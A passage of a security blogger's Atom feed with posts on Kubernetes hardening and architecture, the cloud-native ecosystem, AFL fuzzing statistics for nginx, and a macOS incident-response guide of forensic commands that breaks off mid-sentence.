    <updated>2019-07-23T00:00:00-07:00</updated>
    <id>https://www.securesql.info/2019/07/23/kubernetes-kubelet</id>
    <content type="html" xml:base="https://www.securesql.info/2019/07/23/kubernetes-kubelet/"><![CDATA[<h1 id="overview">Overview</h1>

<p>This is the building block that handles pods scheduling based upon resource
constraints, requirements, tolerances, governance, and other policies. The
scheduler’s pod spec and kubeconfig file permissions should be restricted and
only accessible over HTTPS. Please bind to localhost because it exposes
sensitive metrics and health data that doesn’t require authentication by
default.</p>

<h1 id="cis-benchmark">CIS Benchmark</h1>

<p>1.4.1 Ensure that the –profiling argument is set to false (Automated)</p>

<p>1.4.2 Ensure that the –bind-address argument is set to 127.0.0.1 (Automated)</p>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="Kubernetes"/>
    <category term="Scheduler"/>
    <category term="Resource Management"/>
    <category term="CIS Benchmark"/>
    <category term="Security Practices"/>
    <category term="Pod Scheduling"/>
    <category term="Governance"/>
    <category term="HTTPS"/>
    <category term="Configuration Management"/>
    <summary type="html"><![CDATA[Overview]]></summary>
  </entry>
  <entry>
    <title type="html">Kubernetes Information Security Practices</title>
    <link href="https://www.securesql.info/2019/07/16/kubernetes-add-ons-3rd-party-integrations/" rel="alternate" type="text/html" title="Kubernetes Information Security Practices"/>
    <published>2019-07-16T00:00:00-07:00</published>
    <updated>2019-07-16T00:00:00-07:00</updated>
    <id>https://www.securesql.info/2019/07/16/kubernetes-add-ons-3rd-party-integrations</id>
    <content type="html" xml:base="https://www.securesql.info/2019/07/16/kubernetes-add-ons-3rd-party-integrations/"><![CDATA[<h1 id="overview">Overview</h1>

<p>We sponsored a Kubernetes security review because of its’ popular adoption,
glaring insecurities, default insecure states, wasn’t designed to be secure,
and everyone wanted to use it and make it available to the Internet to
interact with (inadvertently most of the time.). As a result, the audit
completed, findings remediated, and the results still direct Kubernetes’
roadmaps. With that being said, The basic information security practices for
designing, creating, maintaining, and retiring kubernetes based workloads are
like many other R&amp;D operational projects. Ensure one receives timely
notifications for vulnerabilities, misconfigurations with a security bent, and
general kubernetes security updates. I am happy with the kubernetes-announce
group, the relevant Slack channels, and have automation observe the security
reporting page.</p>

<p>Vulnerability scanning is heavily covered in the CI / CD &amp; Monitoring pipeline
post so I won’t cover it here. Just please perform extremely simple
vulnerability detection with corresponding yum update or apt-get update &amp;&amp;
apt-get upgrade….</p>

<p>Kubernetes allows one to enable alpha and / or beta features. If one is
operating within any Ring, try to avoid the alpha / beta features. Not only do
they come with extremely limited Production-impacting assurances, but may have
limitations or vulnerabilities (or features that by its’ very nature is a
feature or vulnerability depending on ones’ point of view.).</p>

<p>The CIS Benchmark is not contextually aware of the workloads. Please harden
with that in mind and realize by utilizing the benchmark alone will result in
security that is the byproduct of compliance, not the other way around. The
benchmark doesn’t address service specifics, multi-tenancy architectures, and
installer insecurities. Adding on top of that, the Add-ons, plugins, and
workloads are the every changing dynamic that leads to one approaching a near
infinite amount of work to maintain and operate a secure Kubernetes based
workload.</p>

<p>If not utilizing the native Infrastructure as a Service remote management
capabilities (IE AWS Systems Manager / SSM), for most workloads, one will rely
upon ssh or rdp. RDP has its’ own technology stack solving just this problem
that is beyond the scope of this document. &lt;https://docs.microsoft.com/en-
us/windows-server/remote/remote-desktop-services/rds-plan-access-from-
anywhere&gt; is a great start for learning more about remote RDP. For SSH,
enabling a simple bastion host that allows one to expose ssh onto a bastion
host that would allow one to route to the correct node, pod, or cluster
interface. If you are willing, there are many other ways to improve upon the
bastion experience including not utilizing a bastion but relying upon Bless,
Cloudflare remote access, Square’s gssh, ghosttunnel, cloudpassage halo, etc…</p>

<p>What are the risks and compliance controls related to GKE?</p>

<p>See the github repository for details. https://github.com/w8mej/kubernetes_cli</p>

<p>What are the risks and compliance controls related to EKS?</p>

<p>See the github repository for details. https://github.com/w8mej/kubernetes_cli</p>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="Kubernetes"/>
    <category term="Information Security"/>
    <category term="Vulnerability Scanning"/>
    <category term="CI/CD"/>
    <category term="Monitoring"/>
    <category term="Security Practices"/>
    <category term="Compliance"/>
    <category term="Cloud Infrastructure"/>
    <category term="GKE"/>
    <category term="EKS"/>
    <category term="Remote Management"/>
    <summary type="html"><![CDATA[We sponsored a Kubernetes security review because of its’ popular adoption, glaring insecurities, default insecure states, wasn’t designed to be secure, and everyone wanted to use it and make it available to the Internet]]></summary>
  </entry>
  <entry>
    <title type="html">What is a modern, dynamic service and its’ building blocks?</title>
    <link href="https://www.securesql.info/2019/07/13/kubernetes-clusters/" rel="alternate" type="text/html" title="What is a modern, dynamic service and its’ building blocks?"/>
    <published>2019-07-13T00:00:00-07:00</published>
    <updated>2019-07-13T00:00:00-07:00</updated>
    <id>https://www.securesql.info/2019/07/13/kubernetes-clusters</id>
    <content type="html" xml:base="https://www.securesql.info/2019/07/13/kubernetes-clusters/"><![CDATA[<p>When I look at the Cloud Native ecosystem, I am astonished.  The vendor
space’s market capitalization is near $7.78 trillion with funding of $12.26
billion.  Below is a rough ecosystem image.</p>

<p>View fullsize</p>

<p><img src="https://securesql.info/images/CloudNativeRoadmap.png.avif" alt="" /></p>

<p>As I work through the ecosystem, there is no evident, leading “best practice.
Within modern, dynamic environments, there are not obvious answers to empower
an organization to build and operate scalable applications.  There are no best
practices to enable loosely coupled, resilient, manageable, and observable
systems.  Much less do not require 5 FTEs to enable repeatable, predictable,
high-impact outcomes.</p>

<p>Below are high level challenges one will solve as they build and run their
modern, dynamic service:</p>

<h2 id="containerization">Containerization</h2>

<ul>
  <li>
    <p>Commonly seen with Docker</p>
  </li>
  <li>
    <p>Any size and dependencies may be containered</p>
  </li>
  <li>
    <p>Eventual microservices architecture</p>
  </li>
</ul>

<h2 id="registries-and-runtime-execution">Registries and Runtime Execution</h2>

<ul>
  <li>
    <p>Harbor.io is a great registry which stores, signs, and scans container content.  When hooked into Clair, may provide vulnerability information</p>
  </li>
  <li>
    <p>If docker isn’t your thing, OCI-compliant containerd, rkt, and CRI-O work great</p>
  </li>
</ul>

<h2 id="distribution">Distribution</h2>

<ul>
  <li>An implementation of the Update Framework, Notary, is great to start off distributing your services</li>
</ul>

<h2 id="ci--cd">CI / CD</h2>

<ul>
  <li>
    <p>Changes to the source code automatically result in new containers built, tested, and deployed</p>
  </li>
  <li>
    <p>Hopefully canary with blue / green deployments</p>
  </li>
  <li>
    <p>Automated deployments, rollbacks, and testing</p>
  </li>
  <li>
    <p>Orchestration and Application Definitions</p>
  </li>
  <li>
    <p>Kubernetes is leading the orchestration market</p>
  </li>
  <li>
    <p>Aim to utilize a certified Kubernetes distribution or hosting platform</p>
  </li>
  <li>
    <p>Helm charts enables one to define, install, and upgrade even complex Kubernetes enabled services</p>
  </li>
</ul>

<h2 id="analysis-and-observability">Analysis and Observability</h2>

<ul>
  <li>
    <p>Find the right services for logging, tracing, and monitoring</p>
  </li>
  <li>
    <p>Prometheus is great for monitoring</p>
  </li>
  <li>
    <p>Fluentd is wonderful for logging</p>
  </li>
  <li>
    <p>Jaeger isn’t bad at tracing.  Otherwise, look for an Open-Tracing compatible solution</p>
  </li>
</ul>

<h2 id="discovery-mesh-and-proxy">Discovery, Mesh, and Proxy</h2>

<ul>
  <li>
    <p>CoreDNS is flexible and fast.  Great for service discovery</p>
  </li>
  <li>
    <p>Linkerd and Envoy enable mesh architectures, health checking, routing, and load balancing</p>
  </li>
</ul>

<h2 id="networking-policy-enforcement">Networking Policy Enforcement</h2>

<ul>
  <li>
    <p>Istio, Flannel, Calico, or Weave Net are decent general purpose network policy engines</p>
  </li>
  <li>
    <p>Uses range from authorization and admission to data filtering</p>
  </li>
</ul>

<h2 id="database-and-storage">Database and Storage</h2>

<ul>
  <li>
    <p>It really depends on the storage type</p>
  </li>
  <li>
    <p>If one is utilizing MySQL, Vitess works to scale and shard</p>
  </li>
  <li>
    <p>Rook works as a storage orchestrator</p>
  </li>
  <li>
    <p>Etcd provides mechanisms to store data across clusters</p>
  </li>
  <li>
    <p>TiKV works well as a highly performant transactional key-value store</p>
  </li>
</ul>

<h2 id="streaming-and-messaging">Streaming and Messaging</h2>

<ul>
  <li>
    <p>When JSON-REST is not enough, gRPC or NATS is the way to go.</p>
  </li>
  <li>
    <p>Generic RPC usage is implemented in gRPC</p>
  </li>
  <li>
    <p>Complex messaging utilizes NATS (pubsubhub / subscriptions, request / reply, load balancing, etc..)</p>
  </li>
</ul>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="Cloud Native"/>
    <category term="Modern Services"/>
    <category term="Containerization"/>
    <category term="CI/CD"/>
    <category term="Orchestration"/>
    <category term="Kubernetes"/>
    <category term="Microservices"/>
    <category term="Networking"/>
    <category term="Observability"/>
    <category term="Service Discovery"/>
    <category term="Databases"/>
    <category term="Messaging"/>
    <summary type="html"><![CDATA[As I work through the ecosystem, there is no evident, leading best practice.]]></summary>
  </entry>
  <entry>
    <title type="html">Nginx exploit writing weekend</title>
    <link href="https://www.securesql.info/2019/07/11/nginx-fuzzing-exploitation/" rel="alternate" type="text/html" title="Nginx exploit writing weekend"/>
    <published>2019-07-11T00:00:00-07:00</published>
    <updated>2019-07-11T00:00:00-07:00</updated>
    <id>https://www.securesql.info/2019/07/11/nginx-fuzzing-exploitation</id>
    <content type="html" xml:base="https://www.securesql.info/2019/07/11/nginx-fuzzing-exploitation/"><![CDATA[<p>This weekend will be ripe of opportunities for nginx exploit writing. Trying
a new scheduler algorithm and Stensal’s compiler against nginx’s stable code
base.</p>

<p>@meteor:~# afl-whatsup ~/Repository/FuzzMe/Nginx/sbin/findings/</p>

<p>status check tool for afl-fuzz by
&lt;<a href="mailto:lcamtuf@google.com"><strong>lcamtuf@google.com</strong></a>&gt; with scheduler
optimizations by &lt;<a href="mailto:marcel.boehme@acm.org"><strong>marcel.boehme@acm.org</strong></a>&gt;
and &lt;<a href="mailto:john@syn.agency"><strong>john@syn.agency</strong></a>&gt;</p>

<p>Individual fuzzers</p>

<p>==================</p>

<blockquote>
  <blockquote>
    <blockquote>
      <p>fuzzer01 (4 days, 13 hrs) «&lt;</p>
    </blockquote>
  </blockquote>
</blockquote>

<p>cycle 1, lifetime speed 108 execs/sec, path 2626/3234 (81%)</p>

<p>pending 116/2979, coverage 13.58%, 92 crashes</p>

<blockquote>
  <blockquote>
    <blockquote>
      <p>fuzzer02 (4 days, 13 hrs) «&lt;</p>
    </blockquote>
  </blockquote>
</blockquote>

<p>cycle 429, lifetime speed 152 execs/sec, path 3562/4483 (79%)</p>

<p>pending 0/5, coverage 13.58%, 34 crashes</p>

<p>………</p>

<p>Summary stats</p>

<p>Fuzzers alive : 5</p>

<p>Total run time : 22 days, 17 hours</p>

<p>Total execs : 264 million</p>

<p>Cumulative speed : 669 execs/sec</p>

<p>Pending paths : 116 faves, 2999 total</p>

<p>Pending per fuzzer : 23 faves, 599 total (on average)</p>

<p>Crashes found : 471 locally unique</p>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="Nginx"/>
    <category term="Exploit Writing"/>
    <category term="Fuzzing"/>
    <category term="Security Research"/>
    <category term="Scheduler Optimization"/>
    <category term="Fuzzing Tools"/>
    <category term="Nginx Exploits"/>
    <summary type="html"><![CDATA[This weekend will be ripe of opportunities for nginx exploit writing. Trying a new scheduler algorithm and Stensal's compiler against nginx's stable code base.]]></summary>
  </entry>
  <entry>
    <title type="html">Kubernetes Basics</title>
    <link href="https://www.securesql.info/2019/07/05/generic-cloud-native-kubernete-things-need-securing/" rel="alternate" type="text/html" title="Kubernetes Basics"/>
    <published>2019-07-05T00:00:00-07:00</published>
    <updated>2019-07-05T00:00:00-07:00</updated>
    <id>https://www.securesql.info/2019/07/05/generic-cloud-native-kubernete-things-need-securing</id>
    <content type="html" xml:base="https://www.securesql.info/2019/07/05/generic-cloud-native-kubernete-things-need-securing/"><![CDATA[<p>Following up from the previous post, let’s take a look at the simplest part of
the previously documented multi-tenancy architecture (MTA) that provides high
scores for availability, authenticity, confidentiality, portability, and
integrity - its’ orchestration, scaling, deployment, and container mgt.
tooling. “Kubernetes is a portable, extensible, open-source platform for
managing containerized workloads and services, that facilitates both
declarative configuration and automation. It has a large, rapidly growing
ecosystem….” &lt;https://kubernetes.io/docs/concepts/overview/what-is-
kubernetes/&gt; if you want to learn more. Let’s start off with Kubernet’s
building blocks. The typical architecture is akin to;</p>

<p><img src="https://securesql.info/images/kubes.png.avif" alt="" /></p>

<p><img src="https://securesql.info/images/k8s.png.avif" alt="" /></p>

<p>Which could run on assets like a Raspberry PI (ARM) cluster</p>

<p><img src="https://securesql.info/images/432.jpg" alt="" /></p>

<p>or transform workloads into pods that evaporate in the cloud when terminated</p>

<p><img src="https://securesql.info/images/4321.png.avif" alt="" /></p>

<p><img src="https://securesql.info/images/543.png.avif" alt="" /></p>

<p><img src="https://securesql.info/images/123.png.avif" alt="" /></p>

<p>The commonality to the above simple to diverse architectures leads one to see
common building blocks or layers of abstractions inherent to any Kubernete’s
based workload. The basic building blocks are as follows;</p>

<p>###<br />
Controller Manager</p>

<ul>
  <li>
    <p>A single binary running as a single process emulating separate controller process that is responsible for observing and respond to node availability concerns, pod replication, endpoints, and handling service account and tokens.</p>
  </li>
  <li>
    <p>Optionally may include a cloud controller manager to integrate deeper into a cloud providers’ infrastructure such as AWS security groups, application load balancers, API Gateways, S3 storage backends, etc…. Cloud controller features vary from each IaaS provider.</p>
  </li>
</ul>

<h3 id="apiserver">APIServer</h3>

<ul>
  <li>The public facing API service. This is how one interacts with Kubernete’s backend. One may operate multiple APIServers within a single cluster. Interactions involve simple curl commands to kube-ctl to 3rd party tools / services.</li>
</ul>

<h3 id="scheduler">Scheduler</h3>

<ul>
  <li>This component is the algorithmic part that provides Kubernete’s magic. The service handles policy constraints, locality and affinity, deadlines, interference, resource requirements, and similar “what should happen when on what object?”</li>
</ul>

<h3 id="etcd">ETCD</h3>

<ul>
  <li>A datastore used by Kubernete’s backend to ensure highly available consistent access to a key value datastore. Logically represented as a flat binary space. Physically, as a B+ Tree with nodes as key value pairs. Each “state” contains only the difference from the previous state. Each difference may link to multiple nodes in the tree. This is extremely important to know when we talk about managing ETCD’s risk in a MTA.</li>
</ul>

<h3 id="pods">Pods</h3>

<ul>
  <li>At its’ simplest use case, Pods are dynamically created, destroyed, and migrated among the nodes in the cluster. Kubernetes approached this ephemeral state by using Services as an abstraction of backend Pods. These pods operate within a given Node at any one time. Similar to the Heisenberg uncertainty principle but at a much, much slower speed and known possible locations / states. Pods are the simplest compute workload. They may consist of one or many containers with storage / network resources and a spec (PodSpecs) for how to run the container(s.). For most kubernetes architectures, the context of the pod is a set of *nix namespaces, croups, and other isolation techniques - similar to a Docker container. Within each pod context, additional isolations may be applied. An advanced use case has a pod with multiple containers. One container servers data stored in a shared volume while a separate sidecar refreshes those files. Another container runs a Node.JS app to interact with the two other containers. The pod wraps those storage, network, compute, and containers into a single object.</li>
</ul>

<h3 id="nodes">Nodes</h3>

<ul>
  <li>
    <p>This is where things may get a bit weird due to the service mesh, cloud controller manager, and similar add ons. A node may consist of many different building blocks. A typical node has the following blocks;</p>
  </li>
  <li>
    <p>Kublet consumes specifications (PodSpecs) and ensures its’ containers are running and healthy. It has no concept of containers running not created by Kubernetes. This is a critical point to note in case a malicious individual is able to run a container on a node that was not created via Kubernetes. The closest on-premise analog would be a rootkit without Ring 0 privileges. If not disabled, one may inject ephemeral containers for “debugging” purposes.</p>

    <ol>
      <li>
        <p>Runtime</p>
      </li>
      <li>
        <p>Kubernetes natively supports various container runtimes. CRI-O, containers, and Docker. Pretty much anything that conforms to Kubernete’s Container Runtime Interface. With respect to security, Docker wasn’t built to be secure and has a lot of bloat that requires a significant amount of security attention and controls to mitigate. Containerd was built to be simple, robust, and portable. CRI-O is a lightweight alternative to Docker that uses runc or Kata. Kubernetes is aligning itself to the OCI spec so they do not need to focus on this challenge as Kubernetes was originally meant for orchestration, not formats and workload runtimes. <a href="https://opencontainers.org/">https://opencontainers.org/</a></p>
      </li>
      <li>
        <p>Kube-proxy is one of those weird things mentioned above. Kube-proxy is a simple network proxy that maintains and enforces the network policy on each node in the cluster and the cluster’s ingress / egress traffic. Kube-proxy could use iptables, pf, or ipvs. Typically operates at OSI Layer 4, the proxy can operate at different OSI layers for efficiency and features. For instance, if traffic is sent to the cluster’s public facing IP address, kube-proxy’s iptable setup would capture that traffic, forward it directly to one of the pods via DNAT. Kube-proxy is not operating as a proxy on Layer 4. It only created IPTable rules and doesn’t need to internally context switch between the host’s kernel space and user space. Hence considered Layer 3 in this setup. As a result, much faster and efficient. But one gives up the proxy functionality. After a few years of limitations with this approach, many add ons, plugins, and efforts to push aside kube-proxy has lead to many different projects to handle this functionality and more I haven’t discussed yet. Hashicorp’s Consul, Lyft’s Istio, flannel, etc…. Just realize there is weird stuff going on here that affects the security and MTA criteria but the weirdness is specific to the technology, add on, MTA, and plugin used.</p>
      </li>
    </ol>
  </li>
  <li>
    <p>Plugins and Add Ons</p>

    <ul>
      <li>Kubernetes became popular as its features requests, use cases, and popularity grew beyond its limited engineering resources. Too popular some would say. I would like to think they created an Add-on feature set that would allow others to add functionality to Kubernetes without mucking around in the core code or changing default behaviors for everyone or a vendor would lock in the community with their proprietary offerings. Some of these add ins extend network functionality such as writing Cisco network access control list languages, native layer 3 BGP, VXLAN, Cisco’s software defined networking, multiple network interfaces for a Pod, service discovery, DNS, dashboards, cute charts and graphs, and far too many other use cases to be listed here. Supply chain risks exist and there isn’t a tight control or assurances made if the Add ons are vulnerable, exploitive, etc…. Hence why over at the Cloud Native Computing Foundation, we attempted to address it across all cloud-native services - <a href="https://github.com/cncf/sig-security/blob/e6dfeb2f767b36c747831850e2a3fdf4f9c26aea/supply-chain-security/README.md">https://github.com/cncf/sig-security/blob/e6dfeb2f767b36c747831850e2a3fdf4f9c26aea/supply-chain-security/README.md</a></li>
    </ul>
  </li>
</ul>

<p>Coming up next week is Part 3 where we get our elbows into Kubernete’s
security.</p>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="Kubernetes"/>
    <category term="Cloud Security"/>
    <category term="Containerization"/>
    <category term="Container Orchestration"/>
    <category term="Scaling"/>
    <category term="Deployment"/>
    <category term="Security"/>
    <category term="Cloud-Native"/>
    <category term="DevOps"/>
    <summary type="html"><![CDATA[Let’s take a look at the simplest part of the previously documented multi-tenancy architecture]]></summary>
  </entry>
  <entry>
    <title type="html">What does it take to break into a Cloud Service?</title>
    <link href="https://www.securesql.info/2019/06/29/cp-rsync-cloud/" rel="alternate" type="text/html" title="What does it take to break into a Cloud Service?"/>
    <published>2019-06-29T00:00:00-07:00</published>
    <updated>2019-06-29T00:00:00-07:00</updated>
    <id>https://www.securesql.info/2019/06/29/cp-rsync-cloud</id>
    <content type="html" xml:base="https://www.securesql.info/2019/06/29/cp-rsync-cloud/"><![CDATA[<p>Sometimes, all it takes is cp and rsync. See the image below for an example.</p>

<p><img src="https://securesql.info/images/exploit" alt="" /></p>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="Cloud Security"/>
    <category term="Exploitation"/>
    <category term="File Transfer"/>
    <category term="cp"/>
    <category term="rsync"/>
    <category term="Cloud Service"/>
    <category term="Cybersecurity"/>
    <category term="Threat Intelligence"/>
    <summary type="html"><![CDATA[Sometimes, all it takes is cp and rsync. See the image below for an example.]]></summary>
  </entry>
  <entry>
    <title type="html">When your SIEM models are not enough</title>
    <link href="https://www.securesql.info/2019/03/06/sigopt/" rel="alternate" type="text/html" title="When your SIEM models are not enough"/>
    <published>2019-03-06T00:00:00-08:00</published>
    <updated>2019-03-06T00:00:00-08:00</updated>
    <id>https://www.securesql.info/2019/03/06/sigopt</id>
    <content type="html" xml:base="https://www.securesql.info/2019/03/06/sigopt/"><![CDATA[<p>Upon a suggestion from Mr. Hay, I took https://sigopt.com/ for a spin.  I
plugged it into our SIEM and Vulnerability models.  I am astonished.  Just
when I thought every bit of value was squeezed from the systems, it is
continuing to pull out indicators and APT actors like candy at a weight loss
camp.  One should give it a spin when they need to further optimize their
models.  For blackhats, this technique will become a significant pain as
additional academic savy private sector practitioners move beyond log
management and playbooks.</p>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="SIEM"/>
    <category term="Vulnerability Models"/>
    <category term="APT Detection"/>
    <category term="Threat Intelligence"/>
    <category term="Optimization"/>
    <category term="Cybersecurity"/>
    <category term="Threat Hunting"/>
    <category term="Machine Learning"/>
    <summary type="html"><![CDATA[Just when I thought every bit of value was squeezed from the systems, it is continuing to pull out indicators and APT actors like candy at a weight loss camp.]]></summary>
  </entry>
  <entry>
    <title type="html">OSX First Responder - Threat Artifact Gathering</title>
    <link href="https://www.securesql.info/2019/01/12/osx-incident-response/" rel="alternate" type="text/html" title="OSX First Responder - Threat Artifact Gathering"/>
    <published>2019-01-12T00:00:00-08:00</published>
    <updated>2019-01-12T00:00:00-08:00</updated>
    <id>https://www.securesql.info/2019/01/12/osx-incident-response</id>
    <content type="html" xml:base="https://www.securesql.info/2019/01/12/osx-incident-response/"><![CDATA[<h1 id="gathering-information-about-the-mac">Gathering Information about the Mac</h1>

<p>How you go about hunting down malware on a macOS endpoint depends a great deal
on what access you have to the device and what kind of software is currently
running on it. Of course, if you have a EDR protected Mac, for example, you
can do a lot of your hunting right there in the management console or by using
the <a href="https://www.sentinelone.com/blog/full-remote-
shell/">remote shell capability</a>, but for the purposes of this post, we’re going to take an unprotected
device and see how we can detect any hidden malware on it. The principles
remain the same if you have a protected device, and understanding what and
where to look will help you use any threat hunting software you may already
have more effectively.</p>

<p>The other thing to consider is whether you have access to the device directly,
or only via a command line, or only via logs. For the purposes of this
exercise, we’re going to assume that you have access to the command line and
to any logs that can be pulled from it.</p>

<p><strong>Step 1: Get a List of Users</strong></p>

<p>The first thing you need to know is what user accounts exist on the Mac.
There’s a couple of different ways of doing that, but the most effective is
look at the output from dscl, which can show up user accounts that might be
hidden from display in the System Preferences app and the login screen.</p>

<p>A command like</p>

<p>$ dscl . list /Users UniqueID</p>

<p>will show you a lot more than just listing the contents of the /Users folder
with something like ls, which won’t show you hidden users or those whose home
folder is located elsewhere, so be sure to use dscl to get a complete picture.</p>

<p>A downside of the dscl list command is that it will flood you with perhaps a
100 or more accounts, most of which are used by the system rather than used by
console (i.e., login) users. We can narrow the list down by filtering out all
the system accounts by ignoring those that begin with an underscore:</p>

<table>
  <tbody>
    <tr>
      <td>$ dscl . list /Users UniqueID</td>
      <td>grep -v ^_</td>
    </tr>
  </tbody>
</table>

<p>However, there’s nothing to stop a malicious actor from creating an account
name that begins with an underscore, too:</p>

<p>So you should both check through the full list and supplement the user search
with other info about user activity. A great command to use here is w, which
tells you every user that is logged in and what they are currently doing.</p>

<p>Here we see that user _mrmalicious, which wouldn’t have appeared if we
filtered the dscl list by grepping out underscores, is using bash.</p>

<p>While the w utility is a great way to check out who is currently active, it
won’t show up a user that has been and gone, so let’s supplement our hunt for
users with the last command, which indicates previous logins.</p>

<p>$ last</p>

<p>Here’s a partial output, which suggests our user briefly logged in and then
shutdown the system.</p>

<p><strong>Step 2: Check for Persistence</strong></p>

<p>We’ve already covered this in a
<a href="https://www.sentinelone.com/blog/how-malware-persists-on-macos/">previous</a>
post, so please head there first and check out some of the obvious and not-so
obvious ways we describe that bad actors can use to persist across sessions on
a Mac.</p>

<p>Remember also that when looking for LaunchAgents and other processes, you have
to consider all users on the Mac, including the root user, which if present
should be found at /var/root.</p>

<p>Here’s one piece of Mac malware that likes to run from there. A system-level
LaunchDaemon that runs on every boot for all users calls a python script
hidden inside an invisible folder in the root user’s Library folder.</p>

<p>We also need to consider persistence methods that take advantage of open ports
and an internet connection, so we’ll start looking into those next.</p>

<p><strong>Step 3: Check Open Ports and Connections</strong></p>

<p>Malware authors interested in backdoors will often try to set up a server on
an unused port to listen out for connections. A good example of this is the
<a href="https://medium.com/@jonathan.leitschuh/zoom-zero-
day-4-million-webcams-maybe-an-rce-just-get-them-to-visit-your-website-
ac75c83f4ef5">recent Zoom vulnerability</a>, which forced the company to push out an emergency patch in an
attempt to address a zero-day vulnerability for Mac users. Zoom have been
running a hidden server on port 19421 that could potentially expose a live
webcam feed to an attacker and allow remote code execution. This is a good
example of just how easy it is for one privileged process to set up a
persistent server that could act as a backdoor to easily evade detection by
ordinary users, as well as macOS’s built-in security mechanisms.</p>

<p>To detect this kind of issue, we can use netstat and lsof to help check for
this.</p>

<p>First, we use</p>

<table>
  <tbody>
    <tr>
      <td>$ netstat -na</td>
      <td>egrep ‘LISTEN</td>
      <td>ESTABLISH’</td>
    </tr>
  </tbody>
</table>

<p>to list services that are either listening for connections or already
connected.</p>

<p>We can see that there are servers listening in on ports 22, 88, and 445. These
indicate that the Mac’s Sharing preferences are enabled for remote login and
remote file sharing. A full list of ports used by Apple’s services can be
found <a href="https://support.apple.com/en-us/HT202944">here</a>.</p>

<p>Next, let’s use</p>

<p>$ lsof -i</p>

<p>to list all files with an open IPv4, IPv6 or HP-UX X25 connection.</p>

<p>This output gives us quite a bit of useful information, including the IP
address, command and PID. We can query the ps utility for more information on
each process.</p>

<p>$ ps -p <pid></pid></p>

<p><strong>Step 4: Investigate Running Processes</strong></p>

<p>The ps command has a lot of useful options and is one of a number of tools you
can use to see what’s running on a Mac at the time of collection.</p>

<p>One of the first things I’ll do is get a full list of all processes by running
this as the superuser</p>

<p>$ ps -axo user,pid,ppid,%cpu,%mem,start,time,command</p>

<p>I will normally dump that out to a text file and pay particular interest to
commands where the PPID, the parent process identifier, is something other
than 1, indicating a user process that’s also spawning child processes.</p>

<p>I also like to dump the output from</p>

<p>$ lsappinfo list</p>

<p>as that gives a lot of useful information about applications including the
executable path, pid, bundle identifier (useful for detection purposes) and
launch time.</p>

<p>You should also examine running daemons, agents and XPC services through the
launchctl utility. I find the older, deprecated (but still functional) syntax
somewhat easier to parse than the newer syntax, but that may be just my
preference from habit, so experiment with either.</p>

<p>In the old syntax, you can simply run</p>

<p>$ launchtl list</p>

<p>to get a lot of useful information on what’s running in that particular user’s
domain. The same command prepended with sudo will produce a list of services
running in the system-wide domain.</p>

<p>For the newer syntax, use something like</p>

<p>$ launchctl print user/501</p>

<p>Replacing ‘501’ for the UID of any user you’re interested in. Use</p>

<p>$ launchctl print system</p>

<p>to target the system-wide domain.</p>

<p>The output between the old and the new syntax is quite different, and which
you find more useful may depend on what kind of information you want. I often
use the old syntax and grep out anything with a com.apple label so that I can
focus on (mostly) non-system processes. However, some macOS malware does
deliberately use the name “apple” in their labels precisely in an attempt to
hide in the weeds, so if you do follow that suggestion be sure that you’re
parsing items with “apple” labels somewhere else, too (e.g., such as from the
data you received from <a href="https://www.sentinelone.com/blog/how-malware-persists-on-macos/">examining the Launch
folders</a> or
from using the ps utility).</p>

<p><strong>Step 5: Investigate Open Files</strong></p>

<p>Earlier we used lsof with the -i option to list open ports, but we can also
list all open files by just running lsof without any flags at all. That
produces quite a mountain of information and you’ll want to quickly narrow it
down to make it manageable.</p>

<p>If the system is running with System Integrity Protection turned on (tip: you
can determine that with the command csrutil status), I will normally parse the
output of lsof in something like BBEdit and remove all lines that contain
references to the System folder. Bear in mind that doing so could cause you to
miss something – not all System folders are protected by SIP, but in the early
stages of an investigation I will leave that kind of possibility for later in
the event that I don’t find any other IOCs (Indicators of Compromise).</p>

<p>For similar reasons, I’ll tend to focus first on open files that don’t belong
to regular apps. Again, keep in mind the caveat that malware authors can
sometimes use regular apps to <a href="https://www.sentinelone.com/blog/malware-living-off-land-with-
certutil/">live off the
land</a>, exploit <a href="https://www.sentinelone.com/blog/how-
two-firefox-zero-days-led-to-two-macos-backdoors/">browser zero days</a> or sneak in via <a href="https://www.sentinelone.com/blog/supply-chain-attacks/">supply
chain attacks</a>, so be
judicious in what you filter out and remember to go back over anything you
skimmed or ignored later on if necessary.</p>

<p><strong>Step 6: Examine the File System</strong></p>

<p>If I haven’t found any suspicious processes at this point, that could well be
because the malware has already finished its execution, so next it’s time to
start making an initial investigation into the file system. At this point,
we’re just trying to establish that a threat exists, rather than do a deep
forensic dive on the entire system (we’ll cover that in a future post), so
let’s look at some of the resources you can quickly access and parse to look
for evidence of malicious behaviour.</p>

<p>A word of warning, though, before we start. If you’re dealing with a macOS
system from 10.14 Mojave onwards, you may find command line investigations
hampered by macOS’s<a href="https://www.sentinelone.com/blog/mojaves-security-hardening-user-
protections-bypassed/"> recent user
protections</a>. In order to avoid those, ensure that Terminal has been
added to the Full Disk Access panel in the Privacy pane.</p>

<p>I tend to start by making an initial audit of files in certain locations that
are often populated by malware. These include hidden files and folders in the
User’s home folder, unusual folders added to the /Library and ~/Library
folders, and the Application Support folders within all of those (remember
there’s a separate Library folder for every user as well as the one at the
computer domain level).</p>

<p>You can get those for the current user and the computer domain with a one-
liner:</p>

<p>$ ls -al ~/.* ~/Library /Library ~/Library/Application Support
/Library/Application Support/</p>

<p>You’ll need to drop down to sudo and iterate over users with a bash script if
there’s more than one user account on the Mac.</p>

<p>Next, check the /Users/Shared folder, and the temp directories at /private/tmp
and the user’s Temporary Directory (these are not the same), which you can get
to using the $TMPDIR environment variable.</p>

<p>$ ls -al /Users/Shared<br />
$ ls -al /private/tmp<br />
$ ls -al $TMPDIR</p>

<p>Also, don’t forget that you should already have a list of items present in the
Launch folders and any Cron jobs from your investigation into persistence
mechanisms. More often than not the program arguments of these will have
already led you to other locations of interest.</p>

<p>In the majority of cases, if a Mac has been infected the above steps will have
turned up something and directed my searches further, but if not, there’s
still a few other things to look for. If the time since the suspected
infection is still relatively recent (within a few days or less), you may try
a find search to look for any files created since or between a certain time or
date. For example, this will find any files modified in the current working
